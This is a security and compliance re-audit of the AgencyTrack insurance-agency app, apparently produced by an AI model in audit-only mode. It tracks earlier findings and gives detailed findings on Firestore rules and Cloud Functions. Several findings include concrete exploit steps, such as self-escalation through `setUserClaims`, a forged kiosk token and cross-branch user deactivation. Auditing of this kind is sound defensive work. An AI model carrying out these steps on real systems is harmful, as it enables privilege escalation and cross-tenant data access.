# AgencyTrack — Full Code, Security & Compliance Re-Audit (2026-09-24)

- **Date:** 2026-09-24
- **Audited commit:** `9a2e572dd1245ea82bb2e8165aac2eccb87bfcd8` (`main` = `origin/main` at audit start)
- **Model:** Claude Opus 5.5 (`claude-opus-5-5`), with two Sonnet 5 read-only evidence sweeps (old-finding evidence; new-surface money/date/perf patterns). All judgements, severities and statuses are the main model's.
- **Mode:** AUDIT-ONLY. No source, rules, config, dependency or data was changed. Commands run: `git` read commands, `npm audit --omit=dev` (root + `functions/`), `npm run build`. No Firestore or Admin SDK calls.
- **Predecessors:** `agencytrack-audit-2026-07-04.md` and `agencytrack-audit-2026-07-11.md` were deleted on 2026-09-24; only heading outlines survive (`C:\Users\noryk\Downloads\RECOVERED-OUTLINE-*.md`). The 07-04 outline carries no finding IDs; its top 8 are taken from `docs/audits/agencytrack-audit-2026-07-05-delta.md`.

---

## 1. Executive summary

**Overall posture: fair for a single-tenant pilot, not ready for multi-tenant or external exposure.** Newer surfaces (call-activity ingest, OIPA import, compliance nudges, `updateUser`) are built carefully: identity comes from the token, inputs are bounded, tokens are hashed, writes are re-checked server-side. The weak points are older and structural: (1) authorization is enforced at *tenant* granularity almost everywhere, while the business boundary is the *branch* and *unit*; (2) a few privileged paths trust client input outright; (3) nothing in CI runs the Firestore rules tests, so rules regressions ship unseen; (4) the compliance programme (erasure, retention, audit trail, breach readiness) has not moved since July.

### Top 5 risks

1. **SEC-01 — `setUserClaims` lets any `tenant_admin` make itself (or anyone) `platform_admin` or move a user to another tenant.** Still open from July (old SEC-001). No client code calls it. Deleting the export closes it.
2. **SEC-03 — Any manager, including a unit manager, can write `kioskTokens` directly** and then exchange a self-made, never-expiring token for a kiosk session on *any* branch. New since July.
3. **SEC-07 / SEC-08 — Financial and policyholder data is readable across branch (and for persistency, by every agent and every kiosk) in the tenant.** `persistency` list is tenant-wide; policies, financing and reconciliation reads use `canManage()` with no branch scope; BMs can lapse or confirm any branch's policy.
4. **SEC-21 — Rules tests never run in CI.** `tests/rules/**` and `firestore.rules.test.mjs` are excluded from `vitest` and there is no emulator job for them; `main` protection is admin-bypassable. A rules regression is invisible until production.
5. **SEC-10 — Logout leaves the full Firestore IndexedDB cache on the device, and a corrupt cache has no recovery path** (observed live 2026-09-23, `ID: b815`, app stuck on load). Field agents share and lose phones.

### Counts

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 8 |
| Medium | 25 |
| Low | 19 |
| Info | 3 |
| **Total** | **56** |

| Category | Count |
|---|---|
| SEC (security) | 22 |
| PRIV (privacy / compliance) | 9 |
| BUG (correctness) | 12 |
| PERF (performance) | 7 |
| COST | 1 |
| ARCH (maintainability) | 5 |

Old findings: **FIXED 8 · PARTIAL 14 · STILL-OPEN 59 · N/A 1 · not assessable 5** across both earlier audits (§ 2). Nothing on the 07-05 top-5 list has been remediated except the kiosk read-scope gap (PR #801).

(Counts cover the new finding list in § 4. Several new findings consolidate more than one old ID.)

---

## 2. Old-findings status (Step 1)

**Method.** The 07-11 audit's IDs and titles come from its recovered outline. The 07-04 audit used a **different numbering** (its `SEC-002` is not 07-11's `SEC-002`); its IDs and titles are reconstructed from `agencytrack-audit-2026-07-05-delta.md` §§ 1, 3, 4. To avoid collisions, 07-04 IDs are prefixed `A4:` below. Neither original body survives, so each status compares the *described* defect with current source; original line anchors cannot be diffed. No commit message uses any of these IDs (`git log --all --grep=<ID>` → no hits), so "Fixed by" is given only where a commit or FU note names the topic.

**Totals:** 07-11 audit — 53 IDs: **FIXED 6 · PARTIAL 11 · STILL-OPEN 36 · N/A 0**. 07-04 audit (+07-05 delta) — 34 IDs: **FIXED 2 · PARTIAL 3 · STILL-OPEN 23 · N/A 1 · not assessable 5** (title and evidence both lost). Combined: **FIXED 8 · PARTIAL 14 · STILL-OPEN 59 · N/A 1 · not assessable 5**.

### 2a. 07-11 audit

| Old ID | Old title (outline) | Status | Current evidence | Fixed by / carried as |
|---|---|---|---|---|
| SEC-001 | `setUserClaims` sets custom claims entirely from client input | STILL-OPEN | `functions/index.js:484-501` | → SEC-01 |
| SEC-002 | `storage.rules` absent from repo while Storage is used | STILL-OPEN | no `storage.rules`; `firebase.json` has no `storage` key | → SEC-12 |
| SEC-003 | No App Check | STILL-OPEN | no `initializeAppCheck` in `src/`, `functions/` | → SEC-11 |
| SEC-004 | `deactivateUser` / `updateUser` not branch-scoped | STILL-OPEN | `functions/index.js:888-907, 1042-1063`; `firestore.rules:187-193` | → SEC-05 |
| SEC-005 | Agent-of-month CFs accept caller `branchId` | STILL-OPEN | `functions/agentOfMonth/setAgentOfMonth.js:49,70`; `getCandidates.js:22,35` | → SEC-06 |
| SEC-006 | `persistency` tenant-wide `allow list` | STILL-OPEN | `firestore.rules:636` | → SEC-07 |
| SEC-007 | No security headers | STILL-OPEN | `vercel.json:1-5` | → SEC-13 |
| SEC-008 | Unpinned CI action with `GEMINI_API_KEY` + write token | PARTIAL | Gemini job and key gone; actions still tag-pinned (`.github/workflows/ci.yml`) | Gemini retirement (2026-07-17) → SEC-20 |
| SEC-009 | Email templates unescaped | STILL-OPEN | `functions/utils/email.js:21-23, 33-35` | → SEC-14 |
| SEC-010 | Kiosk URL long-lived bearer over public CORS-`*` endpoint | STILL-OPEN | `functions/kiosk/createToken.js:13`; `validateToken.js:21-24` | → SEC-04 (and new SEC-03) |
| SEC-011 | Logout does not clear IndexedDB cache | STILL-OPEN | `src/services/authService.js:17-19` | → SEC-10 |
| SEC-012 | `resolveSalesManagerUid` has no role gate | STILL-OPEN | `functions/index.js:464-482` | → SEC-17 |
| SEC-013 | CSV export lacks formula-injection neutralization | STILL-OPEN | `src/lib/csvExport.js:13-20` | → SEC-15 |
| SEC-014 | Dependency vulnerabilities | PARTIAL | root `found 0 vulnerabilities`; `functions/` 16 (1 critical, 5 high) | root upgrades (no single PR identified) → SEC-16 |
| SEC-015 | Dev seed scripts embed weak hardcoded passwords | PARTIAL | `functions/create-test-managers.cjs` now untracked; tracked literal remains at `scripts/verification/shakedown/seed-phase.mjs:108` | → SEC-19 |
| SEC-016 | Client role routing falls back to Firestore doc role | STILL-OPEN | `src/context/AuthContext.jsx:90-99` | → SEC-18 |
| SEC-017 | `financing` accepts unbounded `adjustmentPct` / authoritative balances | PARTIAL | amounts now typed/non-negative (`firestore.rules:791-796, 839-848`); `adjustmentPct` unbounded (`:849`); no key allowlist (`:831-832`) | K-track rules → SEC-09 |
| PRIV-001 | Right to erasure not implementable | STILL-OPEN | no erasure/purge export in `functions/` or `src/`; `deactivateUser` is soft (`functions/index.js:869-935`) | → PRIV-01 |
| PRIV-002 | No consent / lawful basis for prospect / policyholder PII | STILL-OPEN | no consent field on `policiesService` / `prospectInfoService` create paths; OIPA import adds whole books (`functions/portfolioImport/applyPlan.js`) | → PRIV-02 |
| PRIV-003 | Manager-only records hidden from the subject | STILL-OPEN (by design) | `firestore.rules:1104-1117` comment: agent never reads own coaching notes | → PRIV-08 |
| PRIV-004 | No audit trail on reads / exports | STILL-OPEN | no access/export logging anywhere; exports are client-side Blobs (`src/lib/csvExport.js:43`) | → PRIV-03 |
| PRIV-005 | No breach detection / structured logging | STILL-OPEN | `console.*` only in `functions/` | → PRIV-04 |
| PRIV-006 | Clarity recording of financial surfaces | FIXED | `src/lib/clarityInit.js` prod-gated; `data-clarity-mask` on money surfaces (e.g. `src/components/agent/MoneyNeedsPanel.jsx:1107`) guarded by `clarity-mask-guard.test.js` | Clarity masking work (#786 cited in `PlanSuggestionsCard.jsx:13`) |
| PRIV-007 | Data residency US-hosted | STILL-OPEN | no `.region()` in `functions/` ⇒ default `us-central1`; Firestore location Console-only | → PRIV-06 |
| PRIV-008 | Broad service-account / platform_admin reach; key file on disk | PARTIAL | CFs use ambient credentials (`functions/index.js:12-15`); `functions/service-account-key.json` and `.staging.json` still on disk (git-ignored) | PR #78 key-file removal → PRIV-07 |
| PRIV-009 | No retention / TTL / purge | STILL-OPEN | no TTL policy or purge job | → PRIV-05 |
| PRIV-010 | Subject access exports not subject-oriented or audited | STILL-OPEN | no DSAR export | → PRIV-03 |
| PRIV-011 | No field-level crypto | STILL-OPEN | provider-default encryption only | → PRIV-09 |
| BUG-001 | Financing status machine non-transactional RMW | STILL-OPEN | `src/services/financingService.js:160-186` (`getDoc` → check → `setDoc`) | → BUG-07 |
| BUG-002 | `reconcileFinancing` writes two docs non-atomically | STILL-OPEN | `src/services/financingService.js:586/596` then `:601` (separate transition call) | → BUG-07 |
| BUG-003 | Leaderboard points RMW race in `onSubmissionWrite` | STILL-OPEN | `functions/index.js:1456-1461` (read then `prevPoints + points`, no transaction) | → BUG-08 |
| BUG-004 | Double-count on `submitted → draft → submitted` | PARTIAL | guard at `functions/index.js:1394-1396` blocks submitted→submitted; a revert to draft then resubmit still re-adds | → BUG-08 |
| BUG-005 | Sunday cron TOCTOU clobbers a just-submitted report | STILL-OPEN | `functions/aggregators/sundayDailyToWeekly.js:107-113` (check then `set`, no transaction) | → BUG-09 |
| BUG-006 | Three sites render TTD with `$` / `en-US` | FIXED | `formatCurrency` uses `en-TT` (`src/utils/formatters.js:20-26`); no remaining `en-US` currency formatting in `src/` | not attributable to one PR |
| BUG-007 | Client "today" from UTC shifts a day | PARTIAL | server paths anchored (`functions/aggregators/sundayDailyToWeekly.js:37-46`); ~27 client sites remain (e.g. `CampaignLensPanel.jsx:253`) | → BUG-02 |
| BUG-008 | PersistencyTab infinite skeleton | FIXED | `src/components/agent/PersistencyTab.jsx:190-201` | "0.1a error+Retry contract" |
| BUG-009 | `useMyProduction` no error state | FIXED | `src/hooks/useMyProduction.js:37-48` (`loadError`) | "§1 silent-swallow fix" |
| BUG-010 | AgentDashboard siblings fail silently | PARTIAL | submissions error surfaced (`AgentDashboard.jsx:255-258`); six sibling reads still `.catch(() => null/[])` (`:249-273`) | → BUG-10 |
| BUG-011 | ManagerDashboard swallowed handlers | PARTIAL | `getTenantUsers(...).catch(() => [])` at `ManagerDashboard.jsx:408, 432` | → BUG-10 |
| BUG-012 | CampaignPanel conflates error with empty | FIXED | distinct error / empty states `CampaignPanel.jsx:1043, 1108` | — |
| BUG-013 | `useTeamRoster` infinite spinner when `tenantId` falsy | STILL-OPEN | `src/hooks/useTeamRoster.js:34, 41-42` (early return without `setLoading(false)`) | → BUG-11 |
| BUG-014 | `weekStarting` Sunday invariant UI-only | STILL-OPEN | submissions `create`/`update` (`firestore.rules:316-322`) check no `weekStarting` shape or day; the weekly-plans block says the same outright (`:1848-1849`) | → BUG-12 |
| BUG-015 | Wizard debounce-vs-submit race | FIXED | `src/components/wizard/WizardForm.jsx:438-440` cancels pending autosave | Run 8 A-9 |
| PERF-001 | ManagerDashboard re-fetches YTD submissions + users per mount | PARTIAL | dashboards now code-split; `getTenantUsers` still called at `ManagerDashboard.jsx:212, 408, 432` | → PERF-04 |
| PERF-002 | Persistency per-agent `getDoc` N+1 | PARTIAL | parallelised (`src/services/persistencyService.js:145-152`) but still one read per agent | → PERF-05 |
| PERF-003 | CompliancePanel per-agent `getWeeklyPlan` fan-out | STILL-OPEN | `src/components/manager/CompliancePanel.jsx:235-236` | → PERF-05 |
| PERF-004 | Leaderboard tenant-wide unbounded `onSnapshot` | STILL-OPEN | `src/components/gamification/Leaderboard.jsx:82-97` (no `limit`) | → PERF-06 |
| PERF-005 | `FinancingSelfView` chunk loads eagerly | STILL-OPEN | `AgentDashboard.jsx:71`, `ManagerDashboard.jsx:72`; chunk 627.33 kB | → PERF-01 |
| PERF-006 | Client full-collection aggregations duplicate CF work | STILL-OPEN | e.g. `CareerPortal.jsx` YTD `useMemo` over all submissions | → PERF-07 |
| COST-001 | Hourly leaderboard CF full rescan | STILL-OPEN | `functions/leaderboard/leaderboardAggregate.js:8-19, 439` (`'0 * * * *'`) | → COST-01 |
| COST-002 | App Check absence + tenant-wide persistency list | STILL-OPEN | see SEC-11, SEC-07 | → SEC-11, SEC-07 |
| ARCH-001 | Daily→weekly aggregator twin has no cross-check test | STILL-OPEN | `functions/__tests__/dailyToWeekly.test.js` and `src/lib/schema/__tests__/dailyPatch.test.js` test each side; no parity test | → ARCH-05 |
| ARCH-002 | Financing state machine only in service/UI, not rules | STILL-OPEN | `firestore.rules:797` enum only | → SEC-09 |

### 2b. 07-04 audit (IDs as re-verified in the 07-05 delta)

| Old ID | Old title (reconstructed) | Status | Current evidence | Fixed by / carried as |
|---|---|---|---|---|
| A4:SEC-001 | `setUserClaims` arbitrary claims | STILL-OPEN | `functions/index.js:484-501` | → SEC-01 |
| A4:SEC-002 | Agent-of-month CFs not branch-scoped | STILL-OPEN | as 07-11 SEC-005 | → SEC-06 |
| A4:SEC-003 | Kiosk create/revoke not branch-scoped | STILL-OPEN | `createToken.js:28`; `revokeToken.js` tenant-only check | → SEC-03 |
| A4:SEC-004 | App Check not enforced | STILL-OPEN | as 07-11 SEC-003 | → SEC-11 |
| A4:SEC-005 | Dependency CVEs | PARTIAL | root 0; functions 16 | → SEC-16 |
| A4:SEC-006 | `storage.rules` absent | STILL-OPEN | as 07-11 SEC-002 | → SEC-12 |
| A4:SEC-007 | No CSP / headers | STILL-OPEN | `vercel.json:1-5` | → SEC-13 |
| A4:SEC-008 | (title not recoverable) | not assessable | delta never names it | — |
| A4:SEC-009 | CI omits rules tests and dependency scan | STILL-OPEN | `vite.config.js:101-108`; `ci.yml` | → SEC-21, SEC-16 |
| A4:SEC-010 | (title not recoverable; "functions/ deploy") | not assessable | — | — |
| A4:SEC-011 | (title not recoverable; "functions/ deploy") | not assessable | — | — |
| A5:SEC-012 | `kioskCanRead` tenant-wide | **FIXED** | inline branch checks, e.g. `firestore.rules:54-63` comment + kiosk arms | PR #801 `3d7c391e`; follow-ups `57567786`, `03caee6c`; rules test `tests/rules/kioskBranchScope.rules.test.mjs` |
| A4:PRIV-002 | No erasure path | STILL-OPEN | as 07-11 PRIV-001 | → PRIV-01 |
| A4:PRIV-003 | No DSAR export | STILL-OPEN | as 07-11 PRIV-010 | → PRIV-03 |
| A4:PRIV-004 | No TTL / retention | STILL-OPEN | as 07-11 PRIV-009 | → PRIV-05 |
| A4:PRIV-005 | No access-log emit | STILL-OPEN | as 07-11 PRIV-004 | → PRIV-03 |
| A4:PRIV-006 | No consent / lawful-basis capture | STILL-OPEN | as 07-11 PRIV-002 | → PRIV-02 |
| A4:ARCH-001 | Scheduled functions hardcode one tenant | STILL-OPEN | `functions/index.js:74` `TENANT_ID = 'tatillife_south'`, used at `:125, :135, :169, :180, :505` | → ARCH-04 |
| A4:ARCH-002 | Inline-style cleanup | STILL-OPEN | 430 `style={{` sites in `src/` (excl. tests + the exempt PDF doc) | → ARCH-03 |
| A4:BUG-001 / PERF-002 | AgentDashboard campaign fan-out | PARTIAL | own-scoped, parallel (`AgentDashboard.jsx:469-483`); a failed read becomes `[]` → progress shows 0 (`:479`) | → BUG-06 |
| A4:PERF-001 | Single ~1.13 MB-gz chunk, no `React.lazy` | PARTIAL | now split into route/vendor chunks; `FinancingSelfView` still eager | → PERF-01 |
| A4:PERF-003 | Virtualize MasterSheet | STILL-OPEN | no virtualization library in `src/` or `package.json` | → PERF-07 |
| A4:PERF-004 | Memoize `new Date()` props | not assessable | location lost | — |
| A4:PERF-005 / 006 | Client N+1 batching | STILL-OPEN | `CompliancePanel.jsx:235-236`; `persistencyService.js:145-152` | → PERF-05 |
| A4:PERF-007 | (title not recoverable; "functions/ deploy") | not assessable | — | — |
| A4:PERF-008 | `CashFlowChart` memo | FIXED | `src/components/goals/CommissionPlayground/components/CashFlowChart.jsx:50` `useMemo` | — |
| A5:PERF-009 | GamePlan hub sequential reads on mount | STILL-OPEN | 7 `useEffect`s in `src/components/dashboard/GamePlanV2/index.jsx` | → PERF-07 |
| A5:PERF-010 | `PlanSuggestionsCard` per-suggestion ack writes (Info) | STILL-OPEN (accepted) | `PlanSuggestionsCard.jsx:59-66` | Info, no action |
| A5:PERF-011 | `CareerPortal` client YTD recompute (Info) | STILL-OPEN | `CareerPortal.jsx` main `useMemo` | → PERF-07 |
| A4:COST-001 | App Check absence (cost) | STILL-OPEN | as SEC-11 | → SEC-11 |
| A4:COST-002 | Client read pagination | STILL-OPEN | `Leaderboard.jsx:82-97`; `managerStandardOverrideService.js:103` | → PERF-06, PERF-03 |
| A4:COST-003 | Client read dedupe | STILL-OPEN | `ManagerDashboard.jsx:212, 408, 432` | → PERF-04 |
| A5:A11Y-001 | `text-faint` on decorative CareerPortal elements | N/A | recorded in the delta as a non-finding (decorative, `aria-hidden`) | — |

---

## 3. Prioritized master table

Priority = severity × likelihood × (inverse) effort. P1 = do before pilot go-live; P2 = within the pilot; P3 = before multi-tenant rollout (P10); P4 = backlog.

| ID | Title | Sev | Cat | Effort | Priority |
|---|---|---|---|---|---|
| SEC-01 | `setUserClaims` trusts client role + tenantId (old SEC-001) | Critical | SEC | S | P1 |
| SEC-03 | Managers can write `kioskTokens` directly → self-minted, never-expiring, any-branch kiosk | High | SEC | S | P1 |
| SEC-07 | `persistency` list is tenant-wide for every role incl. agent + kiosk (old SEC-006) | High | SEC/PRIV | S | P1 |
| SEC-21 | Firestore rules tests never run in CI | High | SEC | M | P1 |
| SEC-08 | Policy / financing / reconciliation reads + BM writes not branch-scoped | High | SEC/PRIV | M | P2 |
| SEC-05 | User admin (`deactivateUser`, `updateUser`, users rule) not branch/unit-scoped (old SEC-004) | High | SEC | M | P2 |
| SEC-02 | `canManage()` / `canAccessOwn()` grant `tenant_admin` every tenant | High | SEC | S | P3 |
| SEC-10 | Logout keeps IndexedDB cache; no corrupt-cache recovery (old SEC-011) | Medium | SEC/BUG | S | P1 |
| SEC-06 | Agent-of-month CFs accept any `branchId` (old SEC-005) | Medium | SEC | S | P2 |
| SEC-04 | Kiosk URL is a 1-year bearer credential over a public CORS-`*` endpoint (old SEC-010) | Medium | SEC | M | P2 |
| SEC-09 | Financing money fields: unbounded `adjustmentPct`, no key allowlist, status machine not in rules (old SEC-017, ARCH-002, BUG-001) | Medium | SEC/BUG | M | P2 |
| SEC-11 | No App Check (old SEC-003, COST-002) | Medium | SEC/COST | M | P2 |
| SEC-12 | `storage.rules` not in repo (old SEC-002) | Medium | SEC | S | P2 |
| SEC-13 | No security headers (old SEC-007) | Medium | SEC | S | P2 |
| SEC-14 | Email templates interpolate without HTML escaping (old SEC-009) | Medium | SEC | S | P2 |
| SEC-15 | CSV exports lack formula-injection neutralization (old SEC-013) | Medium | SEC | S | P2 |
| SEC-16 | `functions/` dependency vulnerabilities: 1 critical, 5 high (old SEC-014) | Medium | SEC | S–M | P2 |
| BUG-01 | Agent-declared `settled` counts as production/awards without manager confirmation | Medium | BUG | M | P2 |
| BUG-02 | Client "today" from UTC in ~27 sites (old BUG-007) | Medium | BUG | M | P2 |
| BUG-03 | Silent `parseFloat(v) \|\| 0` money coercion copied across money engines | Medium | BUG/ARCH | M | P3 |
| BUG-04 | YTD production aggregated in two independent loops (hero vs awards) | Medium | BUG | S | P2 |
| PERF-01 | `FinancingSelfView` (627 kB) imported eagerly by both dashboards (old PERF-005) | Medium | PERF | S | P2 |
| SEC-17 | `resolveSalesManagerUid` has no role gate (old SEC-012) | Low | SEC | S | P4 |
| SEC-18 | Client role falls back to Firestore doc role (old SEC-016) | Low | SEC | S | P4 |
| SEC-19 | Tracked script holds a seeded-account password literal (old SEC-015) | Low | SEC | S | P3 |
| SEC-20 | CI actions tag-pinned, not SHA-pinned; no workflow-level `permissions` (old SEC-008) | Low | SEC | S | P4 |
| SEC-22 | Kiosk tokens stored in plaintext as doc IDs (call-source tokens are hashed) | Low | SEC | S | P3 |
| BUG-05 | Persistency inputs are agent-self-writable at the rules layer | Low | BUG | S | P3 |
| PERF-02 | Import rollback reads history one policy at a time | Low | PERF | S | P4 |
| PERF-03 | `managerActivityStandardOverrides` read whole-collection | Low | PERF | S | P4 |
| ARCH-01 | Firestore writes outside `src/services/` (3 sites) | Low | ARCH | S | P4 |
| ARCH-02 | Dead code `CampaignCard.jsx`; duplicated kiosk validator twin | Info | ARCH | S | P4 |

**Carried-over and remaining findings (§ 4.2–4.6):**

| ID | Title | Sev | Cat | Effort | Priority |
|---|---|---|---|---|---|
| PRIV-01 | No erasure path (old PRIV-001, A4:PRIV-002) | High | PRIV | L | P2 |
| PRIV-02 | No lawful-basis / consent record for policyholder & prospect PII, incl. OIPA import (old PRIV-002) | High | PRIV | M | P2 |
| PRIV-03 | No audit trail on reads/exports; no DSAR export (old PRIV-004, PRIV-010) | Medium | PRIV | M | P3 |
| PRIV-04 | No breach detection / structured logging (old PRIV-005) | Medium | PRIV | M | P2 |
| PRIV-05 | No retention / TTL policy (old PRIV-009) | Medium | PRIV | M | P3 |
| PRIV-06 | US data residency + no processor register (old PRIV-007) | Medium | PRIV | S (doc) / L (move) | P2 |
| PRIV-07 | Privileged access: key files on disk, broad admin reach (old PRIV-008) | Medium | PRIV | S | P2 |
| PRIV-08 | Coaching notes hidden from the subject (old PRIV-003) | Low | PRIV | S | P3 |
| PRIV-09 | No field-level encryption (old PRIV-011) | Info | PRIV | L | P4 |
| BUG-07 | Financing transition + reconcile are non-atomic (old BUG-001, BUG-002) | Medium | BUG | M | P2 |
| BUG-08 | Leaderboard points RMW race + resubmit double-count (old BUG-003, BUG-004) | Medium | BUG | S | P2 |
| BUG-09 | Sunday cron TOCTOU can clobber a just-submitted report (old BUG-005) | Medium | BUG | S | P2 |
| COST-01 | Hourly leaderboard CF rescans all submissions + users (old COST-001) | Medium | COST | M | P3 |
| ARCH-04 | Scheduled CFs + `onUserCreated` hardcode `tatillife_south` (A4:ARCH-001) | Medium | ARCH | M | P3 |
| BUG-06 | Campaign progress read failure renders as 0 (A4:BUG-001) | Low | BUG | S | P3 |
| BUG-10 | Sibling dashboard reads fail silently (old BUG-010, BUG-011) | Low | BUG | S | P3 |
| BUG-11 | `useTeamRoster` infinite spinner on falsy `tenantId` (old BUG-013) | Low | BUG | S | P4 |
| BUG-12 | `weekStarting` Sunday invariant not in rules (old BUG-014) | Low | BUG | S | P3 |
| PERF-04 | ManagerDashboard fetches tenant users up to 3× (old PERF-001) | Low | PERF | S | P3 |
| PERF-05 | Per-agent read fan-outs (old PERF-002, PERF-003) | Low | PERF | M | P3 |
| PERF-06 | Unbounded leaderboard listener (old PERF-004) | Low | PERF | S | P3 |
| PERF-07 | Client-side aggregations / no virtualization (old PERF-006, A5:PERF-009/011, A4:PERF-003) | Info | PERF | M | P4 |
| ARCH-03 | 430 inline `style={{}}` sites vs "NO inline styles" rule (A4:ARCH-002) | Low | ARCH | M | P4 |
| ARCH-05 | Daily→weekly aggregator twin has no parity test (old ARCH-001) | Low | ARCH | S | P3 |

---

## 4. Findings

### 4.1 Security (OWASP Top 10 2021 / ASVS 4.0.3)

#### SEC-01 — `setUserClaims` sets custom claims entirely from client input *(old SEC-001, STILL-OPEN)*
- **Category / control:** OWASP A01 Broken Access Control; ASVS V4.1.1, V4.2.1. ISO 27001 A.5.15, A.8.2.
- **Severity:** Critical — one call turns a tenant admin into a cross-tenant `platform_admin`.
- **Confidence:** Confirmed (source).
- **Location:** `functions/index.js:484-501`.
- **Evidence:** the only gate is `['platform_admin','tenant_admin'].includes(context.auth.token.role)` (`:485`). `role`, `tenantId`, `branchId`, `ownedBranchIds` and target `uid` all come from `data` (`:489`) and are written verbatim with `setCustomUserClaims` (`:498`). No role allowlist, no tenant match, no self-check. `git grep` finds **no client caller** — `updateUser` (`functions/index.js:970`) replaced it with a checked, claim-atomic path.
- **Exploit:** a `tenant_admin` calls `setUserClaims({uid: <self>, role: 'platform_admin', tenantId: 'x'})`, refreshes the token, and every `getRole() in ['platform_admin', …]` arm in `firestore.rules` opens for every tenant. Same call can move any user of any tenant (uids are not secret to admins) into the caller's tenant.
- **Recommendation:** delete the export (it has no caller). If it must stay, restrict to `platform_admin`, allowlist roles, and require `tenantId === caller tenant` for `tenant_admin`.
- **Impact:** security ▲▲▲ (removes the only single-call privilege escalation); privacy ▲▲ (cross-tenant data); correctness —; performance —; cost —; UX —; maintainability ▲ (one less dead privileged endpoint).
- **Effort:** S · **Change-risk:** Low (no caller) · **Priority:** P1.

#### SEC-02 — `canManage()` / `canAccessOwn()` grant `tenant_admin` access to every tenant *(new)*
- **Category / control:** A01; ASVS V4.1.3 (least privilege), V4.2.1. ISO 27001 A.8.3. SOC 2 CC6.1.
- **Severity:** High — cross-tenant read/write for every tenant admin once a second tenant exists.
- **Confidence:** Confirmed (rules text); latent while only one tenant exists.
- **Location:** `firestore.rules:41-47`.
- **Evidence:** `canManage(tenantId)` returns true for `getRole() in ['platform_admin', 'tenant_admin']` **before** the `getTenantId() == tenantId` check, which only guards the `isManager()` branch. `canAccessOwn` has the same shape. Both are used by most tenant sub-collections (users, policies, financing, reconciliation, kioskTokens, goals…).
- **Exploit:** tenant admin of tenant A reads/writes `tenants/B/**` directly from the browser SDK.
- **Recommendation:** `getRole() == 'platform_admin' || (getRole() == 'tenant_admin' && getTenantId() == tenantId) || (isManager() && getTenantId() == tenantId)`. Add a rules test per helper (see SEC-21).
- **Impact:** security ▲▲▲ (multi-tenant prerequisite); privacy ▲▲▲; correctness —; perf —; cost —; UX —; maintainability ▲.
- **Effort:** S · **Change-risk:** Med (touches every block; needs rules tests) · **Priority:** P3 (must land before P10 multi-tenancy; cheap enough to do earlier).

#### SEC-03 — Managers can write `kioskTokens` directly and mint any-branch, never-expiring kiosk sessions *(new)*
- **Category / control:** A01, A04 Insecure Design; ASVS V4.1.2 (no client bypass of server-side checks), V3.3 (session lifetime).
- **Severity:** High — privilege bypass inside the tenant; unit managers gain branch-wide kiosk reads on any branch.
- **Confidence:** Confirmed (source + rules).
- **Location:** `firestore.rules:997-999`; `functions/kiosk/validateToken.js:6-18, 58-66`; `functions/kiosk/createToken.js:5-10, 28`; `functions/kiosk/revokeToken.js:36-37` (tenant-only check — any BM can revoke any branch's kiosk; old A4:SEC-003).
- **Evidence:** the rule is `allow read, write, delete: if canManage(tenantId);` — every manager role, including `unit_manager`, may create arbitrary token docs. `validateTokenData` only rejects on tenant mismatch, `revokedAt`, or a **present** past `expiresAt` (`:13`); a doc with no `expiresAt` never expires. `validateKioskToken` then mints `{role:'kiosk', tenantId, branchId}` from the stored doc (`:62-66`). `createKioskToken` excludes `unit_manager` (`createToken.js:5-10`) and also takes `branchId` from the request without checking the caller owns it (`:28`) — but the rules make the CF gate moot anyway. All managers can also *read* every live token (the token is the doc ID), i.e. copy another branch's kiosk URL.
- **Exploit:** a UM writes `tenants/T/kioskTokens/<random>` = `{tenantId:'T', branchId:'<other branch>'}` and opens `/kiosk/T/<random>`; they now hold a kiosk session for that branch that no TTL ends.
- **Recommendation:** make `kioskTokens` CF-write-only (`allow write: if false`), restrict reads to BM+ of the same branch (or none — the UI can list via a CF). In `validateTokenData`, treat a missing `expiresAt` as invalid. In `createKioskToken`, require `branchId` to be the caller's branch unless the caller is a cross-branch role.
- **Impact:** security ▲▲▲; privacy ▲▲ (kiosk reads user docs + leaderboards of a branch); correctness —; perf —; cost —; UX — (managers already use the CF); maintainability ▲.
- **Effort:** S · **Change-risk:** Low–Med (check the kiosk admin panel reads) · **Priority:** P1.

#### SEC-04 — Kiosk URL is a long-lived bearer credential on a public CORS-`*` endpoint *(old SEC-010, STILL-OPEN)*
- **Category / control:** A07 Identification & Authentication Failures; ASVS V3.3.1, V3.5.
- **Severity:** Medium — a leaked URL (photo of the TV, browser history) is a year of read access.
- **Confidence:** Confirmed.
- **Location:** `functions/kiosk/createToken.js:13` (`TOKEN_TTL_MS` = 1 year), `:49` (token in URL path); `functions/kiosk/validateToken.js:21-24` (`Access-Control-Allow-Origin: *`, unauthenticated `onRequest`, no rate limit).
- **Evidence / scenario:** anyone with the URL from any origin obtains a Firebase custom token for the kiosk identity. There is no device binding, IP allowlist or rotation; revocation is manual.
- **Recommendation:** shorten TTL (e.g. 30–90 days with rolling renewal), bind to a device secret stored on first use, restrict CORS to the app origin, add per-token rate limiting (the call-ingest endpoint already has a pattern: `functions/callActivity/ingestCallActivity.js:124-133, 428-433`).
- **Impact:** security ▲▲; privacy ▲; UX ▼ (occasional re-pairing); others —.
- **Effort:** M · **Change-risk:** Med (kiosk devices must re-pair) · **Priority:** P2.

#### SEC-05 — User administration is tenant-scoped, not branch/unit-scoped *(old SEC-004, STILL-OPEN, widened)*
- **Category / control:** A01 (IDOR); ASVS V4.2.1. ISO 27001 A.5.18.
- **Severity:** High — a BM (or UM) can disable, promote or edit agents in branches (units) they do not run.
- **Confidence:** Confirmed.
- **Location:** `functions/index.js:869-935` (`deactivateUser`), `:970-1215` (`updateUser`); `firestore.rules:187-199` (manager edit arm).
- **Evidence:** `deactivateUser` checks tenant (`:897`) and `CREATION_MATRIX[callerRole]` vs target role (`:904`) — no branch or unit comparison. `updateUser` checks the matrix (`:1042-1063`) and blocks *branch reassignment* for non-cross-branch roles (`:1068`), but a BM may still change the **role** of an agent in another branch (e.g. agent → unit_manager). The users rule manager arm lets any non-UM manager edit `name`, `unitId`, `agentNumber`, `contractStartDate`, `dateOfBirth`… of any tenant user (`:187-193`); only UMs are unit-scoped (`:188`).
- **Exploit:** BM of branch A calls `deactivateUser({targetUid: <agent in B>, active:false})` → agent in B is locked out and their call-source links revoked (`:928`).
- **Recommendation:** in both CFs, for `branch_manager` require `targetData.branchId === callerDoc.branchId`; for `unit_manager` require `targetData.unitId === callerDoc.unitId`. Add `resource.data.branchId == callerBranchId(tenantId)` to the BM path of the users update rule.
- **Impact:** security ▲▲; privacy ▲ (DOB, agent number); correctness ▲ (prevents cross-branch data drift); others —.
- **Effort:** M · **Change-risk:** Med (sales_manager/tenant_admin paths must stay open) · **Priority:** P2.

